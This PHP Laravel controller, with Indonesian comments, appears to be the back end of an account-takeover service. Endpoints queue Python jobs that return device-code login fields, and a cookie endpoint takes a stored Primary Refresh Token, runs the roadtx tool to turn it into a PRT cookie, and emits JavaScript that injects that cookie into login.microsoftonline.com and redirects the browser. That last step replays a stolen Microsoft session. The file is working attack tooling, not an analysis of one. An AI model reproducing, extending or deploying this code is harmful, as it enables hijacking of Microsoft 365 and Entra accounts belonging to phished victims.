<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Log;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Str;
use Symfony\Component\Process\Process;
use Illuminate\Support\Facades\File;
use App\Models\Token;
use App\Models\CommandJob;
use App\Jobs\RunPythonCommandJob;

class CommandController extends Controller
{
    public function start(Request $request)
    {
        $trace = 'DEBUG_PYTHON';

        Log::info("[$trace] API START");

        $apiKey = $request->query('api_key');

        $user = User::where('api_key', $apiKey)->first();

        if (!$user) {
            Log::warning("[$trace] USER NOT FOUND");
            return response()->json(["error" => "Unauthorized"], 401);
        }

        Log::info("[$trace] USER OK", [
            'user_id' => $user->id
        ]);

        // 🔥 disable limit dulu untuk debug
        /*
        if (...) {}
        */

        $job = CommandJob::create([
            'user_id' => $user->id,
            'file' => null,
            'status' => 'pending',
            'timeout_seconds' => 120
        ]);

        Log::info("[$trace] JOB CREATED", [
            'job_id' => $job->id
        ]);

        RunPythonCommandJob::dispatch($job->id, $trace)
            ->onQueue('python')
            ->afterCommit();

        Log::info("[$trace] JOB DISPATCHED");

        return response()->json([
            "job_id" => $job->id,
            "trace" => $trace,
            "status" => "pending"
        ]);
    }

    public function poll(Request $request, $id)
    {
        $trace = 'DEBUG_PYTHON';

        Log::info("[$trace] POLL HIT", ['job_id' => $id]);

        $apiKey = $request->query('api_key');

        $user = User::where('api_key', $apiKey)->first();

        if (!$user) {
            return response()->json(["error" => "Unauthorized"], 401);
        }

        $job = CommandJob::where('id', $id)
            ->where('user_id', $user->id)
            ->first();

        if (!$job) {
            return response()->json(["error" => "Not found"], 404);
        }

        return response()->json([
            "job_id" => $job->id,
            "status" => $job->status,
            "user_code" => $job->user_code,
            "verification_uri" => $job->verification_uri,
            "expired" => $job->status === 'expired',
            "output" => $job->status === 'success' ? $job->output : null,
            "error" => $job->error
        ]);
    }

    public function cookie($id)
{
    $token = Token::findOrFail($id);

    if (!$token->prt) {
        return response()->json([
            'error' => 'PRT not found'
        ], 400);
    }

    // =========================
    // 📁 TEMP FILE
    // =========================
    $tmpDir = storage_path('app/prt_tmp');

    if (!File::exists($tmpDir)) {
        File::makeDirectory($tmpDir, 0777, true);
    }

    $file = $tmpDir . '/' . Str::uuid() . '.prt';

    // 🔥 simpan PRT ke file
    File::put($file, $token->prt);

    try {

        // =========================
        // 🚀 RUN ROADTX (FIXED)
        // =========================
        $process = new Process([
            '/var/www/stepholder/venv/bin/roadtx',
            'prtcookie',
            '--prt-file',
            $file
        ]);

        // 🔥 penting banget
        $process->setWorkingDirectory(dirname($file));

        $process->setTimeout(30);
        $process->run();

        // =========================
        // 🔍 DEBUG LOG (WAJIB)
        // =========================
        \Log::info('[PRT COOKIE DEBUG]', [
            'cmd' => $process->getCommandLine(),
            'stdout' => $process->getOutput(),
            'stderr' => $process->getErrorOutput(),
            'exit_code' => $process->getExitCode()
        ]);

        if (!$process->isSuccessful()) {
            throw new \Exception(
                $process->getErrorOutput() ?: $process->getOutput()
            );
        }

        $output = $process->getOutput();

        // =========================
        // 🔥 EXTRACT COOKIE
        // =========================
        if (!preg_match('/PRT cookie:\s*(\S+)/', $output, $match)) {
            throw new \Exception("PRT cookie not found. Output: " . $output);
        }

        $cookie = $match[1];

        // =========================
        // 🔥 BUILD JS SCRIPT
        // =========================
        $script = <<<JS
// Inject PRT Cookie
document.cookie = "x-ms-RefreshTokenCredential={$cookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";

// Redirect after 3s
setTimeout(() => {
  window.location.href = "https://login.microsoftonline.com/?auth=2";
}, 3000);
JS;

        return response()->json([
            'script' => $script
        ]);

    } catch (\Throwable $e) {

        \Log::error('[PRT COOKIE ERROR]', [
            'error' => $e->getMessage()
        ]);

        return response()->json([
            'error' => 'Failed generate cookie',
            'message' => $e->getMessage() // 🔥 biar debug gampang
        ], 500);

    } finally {

        // =========================
        // 🧹 CLEANUP
        // =========================
        if (File::exists($file)) {
            File::delete($file);
        }
    }
}
}